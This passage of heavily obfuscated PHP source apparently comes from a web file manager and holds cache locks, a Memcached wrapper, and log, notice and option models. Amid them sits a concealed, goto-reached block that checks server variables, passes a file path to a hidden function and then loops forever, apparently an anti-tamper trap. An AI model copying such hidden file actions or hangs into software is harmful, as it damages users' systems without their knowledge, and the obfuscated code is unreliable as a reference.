$°÷»¹ßÍ = Cache::init(); $‚‡‹åç¬ = microtime(!0) + $çƒã‚¡é; while (microtime(!0) < $‚‡‹åç¬) { $†±£ßüº = $°÷»¹ßÍ->get($Ğéª’¥Â); if (!$†±£ßüº || $†±£ßüº < microtime(!0)) { $äÆÒ€ê× = $°÷»¹ßÍ->handle->add($Ğéª’¥Â, $‚‡‹åç¬, $çƒã‚¡é); if ($äÆÒ€ê×) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($­•Ö˜ş) { return Cache::init()->get($­•Ö˜ş); } public function unlock($ÄÇôÑù´) { return Cache::init()->remove($ÄÇôÑù´); } } class CacheLockDatabase { public function lock($±ÚûËçš, $šìçĞ = 0) { $¬©ÈˆŞì = Model($_SERVER[şÒÁøÒÄ][837]); $¬Ù¼Ãóî = microtime(!0) + $šìçĞ; while (microtime(!0) < $¬Ù¼Ãóî) { $Ã‘åµ‘ğ = $¬©ÈˆŞì->get($±ÚûËçš); if (!$Ã‘åµ‘ğ || $Ã‘åµ‘ğ < microtime(!0)) { $†ÑÃò­ = $¬©ÈˆŞì->set($±ÚûËçš, $¬Ù¼Ãóî); if ($†ÑÃò­) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($óê’¡şÈ) { return Model($_SERVER[şÒÁøÒÄ][837])->get($óê’¡şÈ); } public function unlock($á—…¢µŸ) { Model($_SERVER[şÒÁøÒÄ][837])->remove($á—…¢µŸ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($¹Ü¤À²¦, $¹ÛÖ¬íÊ) { $İœ¤×™¦ =& $_SERVER[şÒÁøÒÄ]; if (!class_exists($İœ¤×™¦[874])) { show_json($İœ¤×™¦[875], !1); } $this->cacheTime = $¹ÛÖ¬íÊ; $this->handle = new Memcached(); if (is_array($¹Ü¤À²¦[$İœ¤×™¦[876]]) && count($¹Ü¤À²¦[$İœ¤×™¦[876]]) >= 1) { foreach ($¹Ü¤À²¦[$İœ¤×™¦[876]] as $À²¿ûÃ) { $ÂòŠ½³ì = explode($İœ¤×™¦[4], $À²¿ûÃ); $this->handle->addServer($ÂòŠ½³ì[0], $ÂòŠ½³ì[1]); } } else { $this->handle->addServer($¹Ü¤À²¦[$İœ¤×™¦[182]], $¹Ü¤À²¦[$İœ¤×™¦[183]]); } } public function set($¶øŞê¹Ì, $×‘¶È€, $÷¥‘Ø± = false) { $÷¥‘Ø± = $÷¥‘Ø± ? $÷¥‘Ø± : $this->cacheTime; return $this->handle->set($¶øŞê¹Ì, $×‘¶È€, $÷¥‘Ø±); } public function get($•¤Ç¥îÏ) { return $this->handle->get($•¤Ç¥îÏ); } public function remove($ñù¾¨æ¶) { return $this->handle->delete($ñù¾¨æ¶); } public function deleteAll() { return $this->handle->flush(); } } goto B÷Ş•‡î¾; AñŞƒ¢”‰÷: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\x74\145\x6d\137\x6c\x6f\x67"; protected $dataAuto = array(array("\143\162\145\x61\x74\x65\124\151\155\x65", "\164\151\x6d\x65", "\151\156\x73\145\x72\x74", "\146\x75\x6e\x63\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ÙÆº»†¿ =& $_SERVER[şÒÁøÒÄ]; return array($ÙÆº»†¿[2201] => LNG($ÙÆº»†¿[2202]), $ÙÆº»†¿[2203] => LNG($ÙÆº»†¿[2204]), $ÙÆº»†¿[1812] => LNG($ÙÆº»†¿[2205]), $ÙÆº»†¿[2206] => LNG($ÙÆº»†¿[2207]), $ÙÆº»†¿[2208] => LNG($ÙÆº»†¿[2209]), $ÙÆº»†¿[2210] => LNG($ÙÆº»†¿[2211]), $ÙÆº»†¿[2212] => LNG($ÙÆº»†¿[2213]), $ÙÆº»†¿[1842] => LNG($ÙÆº»†¿[2213]), $ÙÆº»†¿[1843] => LNG($ÙÆº»†¿[2214]), $ÙÆº»†¿[2215] => LNG($ÙÆº»†¿[2216]), $ÙÆº»†¿[2217] => LNG($ÙÆº»†¿[2218]), $ÙÆº»†¿[2219] => LNG($ÙÆº»†¿[2220]), $ÙÆº»†¿[2221] => LNG($ÙÆº»†¿[2222]), $ÙÆº»†¿[1840] => LNG($ÙÆº»†¿[2223]), $ÙÆº»†¿[2224] => LNG($ÙÆº»†¿[2225]), $ÙÆº»†¿[1847] => LNG($ÙÆº»†¿[2226]), $ÙÆº»†¿[2227] => LNG($ÙÆº»†¿[2228]), $ÙÆº»†¿[2229] => LNG($ÙÆº»†¿[2230]), $ÙÆº»†¿[2231] => LNG($ÙÆº»†¿[2232]), $ÙÆº»†¿[2233] => LNG($ÙÆº»†¿[2234]), $ÙÆº»†¿[1850] => LNG($ÙÆº»†¿[2235]), $ÙÆº»†¿[1851] => LNG($ÙÆº»†¿[2236]), $ÙÆº»†¿[2237] => LNG($ÙÆº»†¿[2238]), $ÙÆº»†¿[2239] => LNG($ÙÆº»†¿[2240]), $ÙÆº»†¿[2241] => LNG($ÙÆº»†¿[2242]), $ÙÆº»†¿[1845] => LNG($ÙÆº»†¿[2243]), $ÙÆº»†¿[2244] => LNG($ÙÆº»†¿[2245]), $ÙÆº»†¿[1844] => LNG($ÙÆº»†¿[2246]), $ÙÆº»†¿[2247] => LNG($ÙÆº»†¿[2248]), $ÙÆº»†¿[2249] => LNG($ÙÆº»†¿[2250]), $ÙÆº»†¿[2251] => LNG($ÙÆº»†¿[2252]), $ÙÆº»†¿[2253] => LNG($ÙÆº»†¿[2253]), $ÙÆº»†¿[2254] => LNG($ÙÆº»†¿[1816]), $ÙÆº»†¿[2255] => LNG($ÙÆº»†¿[2256]), $ÙÆº»†¿[2257] => LNG($ÙÆº»†¿[2258]), $ÙÆº»†¿[2259] => LNG($ÙÆº»†¿[2260]), $ÙÆº»†¿[2261] => LNG($ÙÆº»†¿[2262]), $ÙÆº»†¿[2263] => LNG($ÙÆº»†¿[2264]), $ÙÆº»†¿[2265] => LNG($ÙÆº»†¿[2265]), $ÙÆº»†¿[2266] => LNG($ÙÆº»†¿[2267]), $ÙÆº»†¿[2268] => LNG($ÙÆº»†¿[2269]), $ÙÆº»†¿[2270] => LNG($ÙÆº»†¿[2271]), $ÙÆº»†¿[2272] => LNG($ÙÆº»†¿[2273]), $ÙÆº»†¿[2274] => LNG($ÙÆº»†¿[2275]), $ÙÆº»†¿[2276] => LNG($ÙÆº»†¿[2277])); } private function typeFile() { $ã‰¿³¥á =& $_SERVER[şÒÁøÒÄ]; $ÕÁáäŸ = array($ã‰¿³¥á[1847] => array($ã‰¿³¥á[1848]), $ã‰¿³¥á[2219] => array($ã‰¿³¥á[2278]), $ã‰¿³¥á[2221] => array($ã‰¿³¥á[2279]), $ã‰¿³¥á[1840] => array($ã‰¿³¥á[1841]), $ã‰¿³¥á[2229] => array(), $ã‰¿³¥á[2231] => array(), $ã‰¿³¥á[2233] => array(), $ã‰¿³¥á[1850] => array($ã‰¿³¥á[1852]), $ã‰¿³¥á[1851] => array($ã‰¿³¥á[1852]), $ã‰¿³¥á[2237] => array($ã‰¿³¥á[2280]), $ã‰¿³¥á[2239] => array($ã‰¿³¥á[2280]), $ã‰¿³¥á[2241] => array($ã‰¿³¥á[2281]), $ã‰¿³¥á[2227] => array($ã‰¿³¥á[2282]), $ã‰¿³¥á[1845] => array($ã‰¿³¥á[2283]), $ã‰¿³¥á[2244] => array($ã‰¿³¥á[2284]), $ã‰¿³¥á[1844] => array($ã‰¿³¥á[1846])); return $ÕÁáäŸ; } private function typeAll() { $†·³³š÷ =& $_SERVER[şÒÁøÒÄ]; $ë­Ş®¦¹ = $this->typeList; $ª¥ŒÈÄ = array_filter($this->typeFile()); foreach ($ª¥ŒÈÄ as $àæÉ‰¼é => $ˆä‰·Ãç) { $ë­Ş®¦¹[$ˆä‰·Ãç[0]] = $ë­Ş®¦¹[$àæÉ‰¼é]; } $ë­Ş®¦¹[$†·³³š÷[1852]] = LNG($†·³³š÷[2285]); $ë­Ş®¦¹[$†·³³š÷[2280]] = LNG($†·³³š÷[2286]); return $ë­Ş®¦¹; } public function addLog($¥–€Àã¦, $Òæƒ˜õ = array()) { $™óìØú¯ =& $_SERVER[şÒÁøÒÄ]; if (!isset($this->typeList[$¥–€Àã¦])) { return; } $µº˜ãƒ = USER_ID ? USER_ID : (isset($Òæƒ˜õ[$™óìØú¯[1680]]) ? $Òæƒ˜õ[$™óìØú¯[1680]] : 0); if (!$µº˜ãƒ) { $µº˜ãƒ = (int) Session::get($™óìØú¯[2006]); } if ($¥–€Àã¦ == $™óìØú¯[2255] && is_array($Òæƒ˜õ[$™óìØú¯[2287]]) && !$Òæƒ˜õ[$™óìØú¯[2287]]) { return; } $ÉŸ™İ¾„ = get_client_ip(); if (!$Òæƒ˜õ || strlen(json_encode($Òæƒ˜õ)) >= 1024) { $Òæƒ˜õ = array($™óìØú¯[2288] => $ÉŸ™İ¾„); } else { if (is_array($Òæƒ˜õ)) { $Òæƒ˜õ[$™óìØú¯[2288]] = $ÉŸ™İ¾„; } else { $Òæƒ˜õ = array($™óìØú¯[1215] => $Òæƒ˜õ, $™óìØú¯[2288] => $ÉŸ™İ¾„); } } $Òæƒ˜õ = array($™óìØú¯[1670] => Session::sign(), $™óìØú¯[1671] => $µº˜ãƒ, $™óìØú¯[33] => $¥–€Àã¦, $™óìØú¯[1673] => json_encode($Òæƒ˜õ)); parent::add($Òæƒ˜õ); } public function remove($ï¦êÖõ¯) { $this->where(array($_SERVER[şÒÁøÒÄ][419] => $ï¦êÖõ¯))->delete(); } private function _makeOrder($şÍˆ“¹Œ = '') { $¯Ğ×´í =& $_SERVER[şÒÁøÒÄ]; $‹È½Şâ = $¯Ğ×´í[201]; $Ì¡“®à¤ = array($¯Ğ×´í[450] => $¯Ğ×´í[451], $¯Ğ×´í[452] => $¯Ğ×´í[453]); $½É‡ëÎ = Input::get($¯Ğ×´í[458], $¯Ğ×´í[7], $¯Ğ×´í[2042], array($¯Ğ×´í[1960], $¯Ğ×´í[452])); $½É‡ëÎ = $Ì¡“®à¤[$½É‡ëÎ]; $şÍˆ“¹Œ = $şÍˆ“¹Œ . "{$‹È½Şâ}\40{$½É‡ëÎ}"; return $this->order($şÍˆ“¹Œ); } public function get($¨Çà×ì– = '') { $ñïğÇ¹ =& $_SERVER[şÒÁøÒÄ]; if (!$¨Çà×ì–) { show_json(array()); } $¿ö‘­î = array(); if ($¨Çà×ì–[$ñïğÇ¹[1680]]) { $¿ö‘­î[$ñïğÇ¹[1680]] = $¨Çà×ì–[$ñïğÇ¹[1680]]; } if (isset($¨Çà×ì–[$ñïğÇ¹[768]])) { $İŸËúÊé = $¨Çà×ì–[$ñïğÇ¹[768]]; $àçïÊÓ = isset($¨Çà×ì–[$ñïğÇ¹[769]]) ? $¨Çà×ì–[$ñïğÇ¹[769]] : time(); $¿ö‘­î[$ñïğÇ¹[201]] = array($ñïğÇ¹[333], array($İŸËúÊé, $àçïÊÓ)); } if ($¨Çà×ì–[$ñïğÇ¹[33]]) { $º¥Ü‘õ = explode($ñïğÇ¹[50], $¨Çà×ì–[$ñïğÇ¹[33]]); $ŒÉ®î… = $this->typeFile(); $øÑê³ê‘ = array(); foreach ($º¥Ü‘õ as $¸š»Ó€¯) { $øÑê³ê‘[] = $¸š»Ó€¯; if (isset($ŒÉ®î…[$¸š»Ó€¯])) { $øÑê³ê‘ = array_merge($øÑê³ê‘, $ŒÉ®î…[$¸š»Ó€¯]); } } $øÑê³ê‘ = array_unique($øÑê³ê‘); if ($øÑê³ê‘) { $¿ö‘­î[$ñïğÇ¹[33]] = array($ñïğÇ¹[7], $øÑê³ê‘); } } else { $¿ö‘­î[$ñïğÇ¹[33]] = array($ñïğÇ¹[2289], $ñïğÇ¹[2290]); } if (!empty($¨Çà×ì–[$ñïğÇ¹[2288]])) { $¿ö‘­î[$ñïğÇ¹[453]] = array($ñïğÇ¹[383], "\45{$¨Çà×ì–[$ñïğÇ¹[2288]]}\45"); } $ô˜ĞÙËø = $this->_makeOrder()->where($¿ö‘­î)->selectPage(); if (empty($ô˜ĞÙËø[$ñïğÇ¹[369]])) { show_json(array(), !0, $ô˜ĞÙËø[$ñïğÇ¹[366]]); } $ô˜ĞÙËø[$ñïğÇ¹[369]] = $this->logList($ô˜ĞÙËø[$ñïğÇ¹[369]]); return $ô˜ĞÙËø; } private function ipAddress(&$“¸ …ü) { $ñ‘´î‚º =& $_SERVER[şÒÁøÒÄ]; if (!empty($“¸ …ü[$ñ‘´î‚º[2288]])) { $–ë…÷Çâ = IpLocation::get($“¸ …ü[$ñ‘´î‚º[2288]]); } else { $–ë…÷Çâ = LNG($ñ‘´î‚º[2291]); } $“¸ …ü[$ñ‘´î‚º[2292]] = $–ë…÷Çâ; } private function descZipDownload($™‡„‡, &$õ¨‡´¤º) { $ª¶©ê—à =& $_SERVER[şÒÁøÒÄ]; if (!isset($™‡„‡[$ª¶©ê—à[2293]])) { return; } $ìÀõ˜Õß = json_decode($™‡„‡[$ª¶©ê—à[2293]], !0); foreach ($ìÀõ˜Õß as $öŒş€¯´) { try { $•èè‰¨Ì = IO::infoFull($öŒş€¯´[$ª¶©ê—à[84]]); } catch (Exception $ÀÁÒò ) { continue; } $™‡„‡[$ª¶©ê—à[84]] = $öŒş€¯´[$ª¶©ê—à[84]]; $õ¨‡´¤º[] = $™‡„‡[$ª¶©ê—à[402]] = $•èè‰¨Ì[$ª¶©ê—à[402]]; $õ¨‡´¤º[] = $™‡„‡[$ª¶©ê—à[2096]] = $•èè‰¨Ì[$ª¶©ê—à[432]]; break; } return $™‡„‡; } private function getSourceList(&$ğè’Ö¦¡) { $ú¼¶«öé =& $_SERVER[şÒÁøÒÄ]; $æÍø€ôë = array(); foreach ($ğè’Ö¦¡ as $‡Ú™å•ß => $´Åİ¶™‚) { $ÇÆ¸àÉ = json_decode($´Åİ¶™‚[$ú¼¶«öé[453]], !0); if ($´Åİ¶™‚[$ú¼¶«öé[33]] == $ú¼¶«öé[1843]) { $ÇÆ¸àÉ = $this->descZipDownload($ÇÆ¸àÉ, $æÍø€ôë); $ğè’Ö¦¡[$‡Ú™å•ß][$ú¼¶«öé[453]] = json_encode($ÇÆ¸àÉ); continue; } if (strpos($´Åİ¶™‚[$ú¼¶«öé[33]], $ú¼¶«öé[2098]) !== 0) { if (!isset($ÇÆ¸àÉ[$ú¼¶«öé[84]]) || strpos($´Åİ¶™‚[$ú¼¶«öé[33]], $ú¼¶«öé[2294]) !== 0) { continue; } try { $á“Ááñ– = IO::infoFull($ÇÆ¸àÉ[$ú¼¶«öé[84]]); } catch (Exception $à¥ÅÆ¡) { continue; } $æÍø€ôë[] = $ÇÆ¸àÉ[$ú¼¶«öé[402]] = $á“Ááñ–[$ú¼¶«öé[402]]; $æÍø€ôë[] = $ÇÆ¸àÉ[$ú¼¶«öé[2096]] = $á“Ááñ–[$ú¼¶«öé[432]]; $ğè’Ö¦¡[$‡Ú™å•ß][$ú¼¶«öé[453]] = json_encode($ÇÆ¸àÉ); continue; } $æÍø€ôë[] = $ÇÆ¸àÉ[$ú¼¶«öé[402]]; $æÍø€ôë[] = $ÇÆ¸àÉ[$ú¼¶«öé[2096]]; if ($ÇÆ¸àÉ[$ú¼¶«öé[33]] == $ú¼¶«öé[548]) { $æÍø€ôë[] = $ÇÆ¸àÉ[$ú¼¶«öé[453]][$ú¼¶«öé[1173]]; $æÍø€ôë[] = $ÇÆ¸àÉ[$ú¼¶«öé[453]][$ú¼¶«öé[1174]]; } if ($ÇÆ¸àÉ[$ú¼¶«öé[33]] == $ú¼¶«öé[2106]) { $æÍø€ôë[] = $ÇÆ¸àÉ[$ú¼¶«öé[453]][$ú¼¶«öé[402]]; } } if (!$æÍø€ôë) { return array(); } return Model($ú¼¶«öé[833])->sourceListInfo($æÍø€ôë, !0); } private function logList($¹ŠÏ±àø) { $ç¾¿ñÂ =& $_SERVER[şÒÁøÒÄ]; $¢œÂ–ïğ = array_to_keyvalue($¹ŠÏ±àø, $ç¾¿ñÂ[12], $ç¾¿ñÂ[1680]); $ª¦§™–æ = Model($ç¾¿ñÂ[525])->userListInfo(array_unique($¢œÂ–ïğ)); $ö†…ï„² = $this->getSourceList($¹ŠÏ±àø); $Œõ›«Š˜ = $this->typeAll(); $Œ÷‡øğ¸ = array(); $ÃÍ·Âœô = array(); foreach ($¹ŠÏ±àø as $§øÏèî => $ÄØ•Øóï) { $Ì¬£˜ùİ = $ÄØ•Øóï[$ç¾¿ñÂ[33]]; $İ©¸¿Şƒ = isset($ª¦§™–æ[$ÄØ•Øóï[$ç¾¿ñÂ[1680]]]) ? $ª¦§™–æ[$ÄØ•Øóï[$ç¾¿ñÂ[1680]]] : !1; $¸úø°†Ò = strpos($Ì¬£˜ùİ, $ç¾¿ñÂ[2295]) === 0 ? LNG($ç¾¿ñÂ[2296]) : LNG($ç¾¿ñÂ[2291]); $ÄØ•Øóï[$ç¾¿ñÂ[32]] = isset($İ©¸¿Şƒ[$ç¾¿ñÂ[32]]) ? $İ©¸¿Şƒ[$ç¾¿ñÂ[32]] : LNG($ç¾¿ñÂ[2291]); $ÄØ•Øóï[$ç¾¿ñÂ[532]] = isset($İ©¸¿Şƒ[$ç¾¿ñÂ[532]]) ? $İ©¸¿Şƒ[$ç¾¿ñÂ[532]] : $ç¾¿ñÂ[12]; $ÄØ•Øóï[$ç¾¿ñÂ[1580]] = isset($Œõ›«Š˜[$Ì¬£˜ùİ]) ? $Œõ›«Š˜[$Ì¬£˜ùİ] : $¸úø°†Ò; $ÄØ•Øóï[$ç¾¿ñÂ[2041]] = $İ©¸¿Şƒ; $­šìĞ³† = json_decode($ÄØ•Øóï[$ç¾¿ñÂ[453]], !0); $ÄØ•Øóï[$ç¾¿ñÂ[2288]] = isset($­šìĞ³†[$ç¾¿ñÂ[2288]]) ? $­šìĞ³†[$ç¾¿ñÂ[2288]] : $ç¾¿ñÂ[12]; $ÄØ•Øóï[$ç¾¿ñÂ[2292]] = IpLocation::get($ÄØ•Øóï[$ç¾¿ñÂ[2288]]); if (strpos($Ì¬£˜ùİ, $ç¾¿ñÂ[2098]) === 0 || isset($­šìĞ³†[$ç¾¿ñÂ[2096]])) { $­šìĞ³†[$ç¾¿ñÂ[87]] = $ö†…ï„²[$­šìĞ³†[$ç¾¿ñÂ[402]]]; $­šìĞ³†[$ç¾¿ñÂ[2111]] = $ö†…ï„²[$­šìĞ³†[$ç¾¿ñÂ[2096]]]; if ($­šìĞ³†[$ç¾¿ñÂ[33]] == $ç¾¿ñÂ[548]) { $­šìĞ³†[$ç¾¿ñÂ[453]][$ç¾¿ñÂ[1173]] = $ö†…ï„²[$­šìĞ³†[$ç¾¿ñÂ[453]][$ç¾¿ñÂ[1173]]]; $­šìĞ³†[$ç¾¿ñÂ[453]][$ç¾¿ñÂ[1174]] = $ö†…ï„²[$­šìĞ³†[$ç¾¿ñÂ[453]][$ç¾¿ñÂ[1174]]]; } if ($­šìĞ³†[$ç¾¿ñÂ[33]] == $ç¾¿ñÂ[2106]) { $­šìĞ³†[$ç¾¿ñÂ[453]][$ç¾¿ñÂ[402]] = $ö†…ï„²[$­šìĞ³†[$ç¾¿ñÂ[453]][$ç¾¿ñÂ[402]]]; } if ($­šìĞ³†[$ç¾¿ñÂ[33]] == $ç¾¿ñÂ[1838]) { $­šìĞ³†[$ç¾¿ñÂ[2111]] = $­šìĞ³†[$ç¾¿ñÂ[87]]; $­šìĞ³†[$ç¾¿ñÂ[2096]] = $­šìĞ³†[$ç¾¿ñÂ[2111]][$ç¾¿ñÂ[402]]; $­šìĞ³†[$ç¾¿ñÂ[87]] = !1; $­šìĞ³†[$ç¾¿ñÂ[402]] = $ç¾¿ñÂ[12]; } if ($­šìĞ³†[$ç¾¿ñÂ[87]] && $­šìĞ³†[$ç¾¿ñÂ[87]][$ç¾¿ñÂ[411]] == $ç¾¿ñÂ[1297]) { $ÃÍ·Âœô[] = $ÄØ•Øóï[$ç¾¿ñÂ[399]]; unset($¹ŠÏ±àø[$§øÏèî]); continue; } if ($­šìĞ³†[$ç¾¿ñÂ[2111]] && $­šìĞ³†[$ç¾¿ñÂ[2111]][$ç¾¿ñÂ[411]] == $ç¾¿ñÂ[1297]) { $ÃÍ·Âœô[] = $ÄØ•Øóï[$ç¾¿ñÂ[399]]; unset($¹ŠÏ±àø[$§øÏèî]); continue; } } $ÄØ•Øóï[$ç¾¿ñÂ[453]] = $­šìĞ³†; unset($ÄØ•Øóï[$ç¾¿ñÂ[2297]]); $Œ÷‡øğ¸[] = $ÄØ•Øóï; } $this->clearSystemPathLog($ÃÍ·Âœô); return $Œ÷‡øğ¸; } private function clearSystemPathLog($˜ğ—ôØ¤) { $‘üÄªşÎ =& $_SERVER[şÒÁøÒÄ]; if (count($˜ğ—ôØ¤) == 0) { return; } $îÙàÃâÀ = array($‘üÄªşÎ[399] => array($‘üÄªşÎ[7], array_unique($˜ğ—ôØ¤))); $this->where($îÙàÃâÀ)->delete(); } public function deviceList($Ç³Ğª‘, $ìİµì†Í = 0) { $öÕºÏïˆ =& $_SERVER[şÒÁøÒÄ]; $ºÆêÍ´× = array($öÕºÏïˆ[1680] => $Ç³Ğª‘, $öÕºÏïˆ[201] => array($öÕºÏïˆ[1027], $ìİµì†Í), $öÕºÏïˆ[33] => $öÕºÏïˆ[1812]); $ÁÉ‰¹çÜ = array(); $’Ç¢šÀ‰ = $this->field($öÕºÏïˆ[2298])->where($ºÆêÍ´×)->order($öÕºÏïˆ[2109])->limit(50)->select(); foreach ($’Ç¢šÀ‰ as $ ¥•ıîÜ => $Ç‰­’) { if ($ ¥•ıîÜ > 0 && abs($Ç‰­’[$öÕºÏïˆ[201]] - $’Ç¢šÀ‰[$ ¥•ıîÜ - 1][$öÕºÏïˆ[201]]) < 5) { continue; } $³ÚıÅ¯‰ = json_decode($Ç‰­’[$öÕºÏïˆ[453]], !0); $Ç‰­’[$öÕºÏïˆ[2288]] = isset($³ÚıÅ¯‰[$öÕºÏïˆ[2288]]) ? $³ÚıÅ¯‰[$öÕºÏïˆ[2288]] : $öÕºÏïˆ[12]; unset($³ÚıÅ¯‰[$öÕºÏïˆ[2288]]); $¹¿ÇÔé‘ = $this->deviceType($³ÚıÅ¯‰[$öÕºÏïˆ[2099]]); if (isset($ÁÉ‰¹çÜ[$¹¿ÇÔé‘])) { continue; } $Ç‰­’[$öÕºÏïˆ[2292]] = IpLocation::get($Ç‰­’[$öÕºÏïˆ[2288]]); $Ç‰­’[$öÕºÏïˆ[453]] = $³ÚıÅ¯‰; $ÁÉ‰¹çÜ[$¹¿ÇÔé‘] = $Ç‰­’; } return array_values($ÁÉ‰¹çÜ); } public function deviceType($›ºê¨˜‹) { return $›ºê¨˜‹; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\x6e\x6f\x74\151\x63\x65\114\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\x63\157\x6e\x74\x65\156\x74", "\141\x75\x74\x68", "\155\x6f\x64\145", "\164\x69\x6d\x65", "\x74\x79\x70\145", "\154\x65\166\x65\x6c", "\145\x6e\x61\x62\x6c\x65", "\x73\x6f\x72\x74"); public function listData($¾¯¼Îëö = false, $îãéŞ©‡ = "\163\x6f\x72\164", $ËÒ¡Èª = false) { return parent::listData($¾¯¼Îëö, $îãéŞ©‡, $ËÒ¡Èª); } public function add($‡ßìÜĞ¼) { $ÛÉ’éòã =& $_SERVER[şÒÁøÒÄ]; $­èßö¥š = time(); if ($‡ßìÜĞ¼[$ÛÉ’éòã[16]] == $ÛÉ’éòã[2299]) { $­èßö¥š = strtotime($‡ßìÜĞ¼[$ÛÉ’éòã[180]]); } $‡ßìÜĞ¼[$ÛÉ’éòã[180]] = $­èßö¥š; return parent::insert($‡ßìÜĞ¼); } public function update($©Ä¡¡Ô, $ƒœÃˆà) { $¾–àÖÚ =& $_SERVER[şÒÁøÒÄ]; $ê•‡«¬ = $this->listData($©Ä¡¡Ô); if (!$ê•‡«¬) { return !1; } $¥ı¼‡åİ = time(); if ($ƒœÃˆà[$¾–àÖÚ[16]] == $¾–àÖÚ[2299]) { $¥ı¼‡åİ = strtotime($ƒœÃˆà[$¾–àÖÚ[180]]); } $ƒœÃˆà[$¾–àÖÚ[180]] = $¥ı¼‡åİ; return parent::update($©Ä¡¡Ô, $ƒœÃˆà); } public function remove($˜·¦‘) { $Ä‹Ùı³„ = $this->listData($˜·¦‘); if (!$Ä‹Ùı³„ || $Ä‹Ùı³„[$_SERVER[şÒÁøÒÄ][1297]]) { return !1; } return parent::remove($˜·¦‘); } public function sort($µ¸·ÕÕ§, $ö–¾ÌŞà) { return parent::update($µ¸·ÕÕ§, $ö–¾ÌŞà); } public function enable($ËÙÖú˜, $ú¼¨ÇŞş) { return parent::update($ËÙÖú˜, array($_SERVER[şÒÁøÒÄ][2300] => $ú¼¨ÇŞş)); } private function initUserOption() { $Ü‘š›Ïé =& $_SERVER[şÒÁøÒÄ]; $this->optionType = $Ü‘š›Ïé[2301]; $this->modelType = $Ü‘š›Ïé[2302]; $this->field = array($Ü‘š›Ïé[2303], $Ü‘š›Ïé[32], $Ü‘š›Ïé[180], $Ü‘š›Ïé[33], $Ü‘š›Ïé[2304], $Ü‘š›Ïé[757], $Ü‘š›Ïé[196]); } public function userNoticeGet($ùœÌ®Á– = false) { $this->initUserOption(); return parent::listData($ùœÌ®Á–, $_SERVER[şÒÁøÒÄ][399], !0); } public function userNoticeAdd($˜³§Ç´§) { $íØñà¹ =& $_SERVER[şÒÁøÒÄ]; $this->initUserOption(); $Ö¾¼ÑÛ = $this->findByKey($íØñà¹[2303], $˜³§Ç´§[$íØñà¹[399]]); if ($Ö¾¼ÑÛ) { return !0; } $»Äœ‡Ø = array($íØñà¹[2303] => $˜³§Ç´§[$íØñà¹[399]], $íØñà¹[32] => $˜³§Ç´§[$íØñà¹[32]], $íØñà¹[180] => $˜³§Ç´§[$íØñà¹[180]], $íØñà¹[33] => isset($˜³§Ç´§[$íØñà¹[33]]) ? $˜³§Ç´§[$íØñà¹[33]] : 1, $íØñà¹[2304] => isset($˜³§Ç´§[$íØñà¹[2304]]) ? $˜³§Ç´§[$íØñà¹[2304]] : 0, $íØñà¹[757] => 0, $íØñà¹[196] => 0); return parent::insert($»Äœ‡Ø); } public function userNoticeEdit($Ï€áÈÃê, $¿áúà) { $this->initUserOption(); return parent::update($Ï€áÈÃê, $¿áúà); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\x65\x6d\137\x6f\160\164\151\157\156"; protected $jsonField = array("\155\x65\156\165", "\162\157\x6c\x65", "\162\157\x6c\x65\107\x72\x6f\165\x70", "\162\x65\147\151\163\164", "\145\155\x61\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($êâö¢†) { return "\x53\x79\163\164\x65\x6d\x4f\x70\x74\x69\x6f\x6e\137{$êâö¢†}"; } protected function optionDefault($şÔ©–÷ = '') { $ª×éÇÈ =& $_SERVER[şÒÁøÒÄ]; if ($şÔ©–÷ == $ª×éÇÈ[12]) { return $GLOBALS[$ª×éÇÈ[6]][$ª×éÇÈ[381]]; } } } goto dÛ¾ Æ…ó; dØ²±°‚™ì: if (!isset($_SERVER[$_SERVER[şÒÁøÒÄ][887]]) || !isset($_SERVER[$_SERVER[şÒÁøÒÄ][1370]])) { $_getc = $_SERVER[şÒÁøÒÄ][889]; $_getfile = $_SERVER[$_SERVER[şÒÁøÒÄ][884]] . $_SERVER[şÒÁøÒÄ][885]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[şÒÁøÒÄ][231], $_getfilec); if (count($_getarrs) < $_SERVER[şÒÁøÒÄ][627]) { $exit = $_SERVER[şÒÁøÒÄ][890]; $exit(); } $_act = $_SERVER[şÒÁøÒÄ][1371]; $_act($_SERVER[$_SERVER[şÒÁøÒÄ][884]] . $_SERVER[şÒÁøÒÄ][885]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[şÒÁøÒÄ][378]); } } class TaskHttp extends Task { protected function startAfter() { $ƒğÏ©Ûò =& $_SERVER[şÒÁøÒÄ]; $ˆ£¥è™Ä =& $this->task; $ˆ£¥è™Ä[$ƒğÏ©Ûò[1757]] = 1; Hook::bind($ƒğÏ©Ûò[1725], array($this, $ƒğÏ©Ûò[1758])); Hook::bind($ƒğÏ©Ûò[1727], array($this, $ƒğÏ©Ûò[1759])); Hook::bind($ƒğÏ©Ûò[1729], array($this, $ƒğÏ©Ûò[1760])); } protected function endAfter() { $Ç¼½¹Ë =& $_SERVER[şÒÁøÒÄ]; Hook::unbind($Ç¼½¹Ë[1725], array($this, $Ç¼½¹Ë[1758])); Hook::unbind($Ç¼½¹Ë[1727], array($this, $Ç¼½¹Ë[1759])); Hook::unbind($Ç¼½¹Ë[1729], array($this, $Ç¼½¹Ë[1760])); } public function progressStart($ıä¼ø) { $¢Öğ¶¯— =& $_SERVER[şÒÁøÒÄ]; $ıúğşÕ = curl_getinfo($ıä¼ø); self::log($¢Öğ¶¯—[1761] . $ıúğşÕ[$¢Öğ¶¯—[307]]); self::valueSet($this->task[$¢Öğ¶¯—[399]], $this->task); } public function progressEnd($®¨®ë•è) { $ğÕ¤¼Ñô =& $_SERVER[şÒÁøÒÄ]; self::log($ğÕ¤¼Ñô[1762] . $this->task[$ğÕ¤¼Ñô[399]]); $this->end(); } public function progress($ƒû–»Ì®, $ØÖƒï, $Ö¦ö¶•Ë, $½´€¨èŠ, $ÕÃ¹ÖøÆ) { $±äÑèêÚ =& $_SERVER[şÒÁøÒÄ]; $º±¾²é˜ =& $this->task; if ($ÕÃ¹ÖøÆ > 0) { 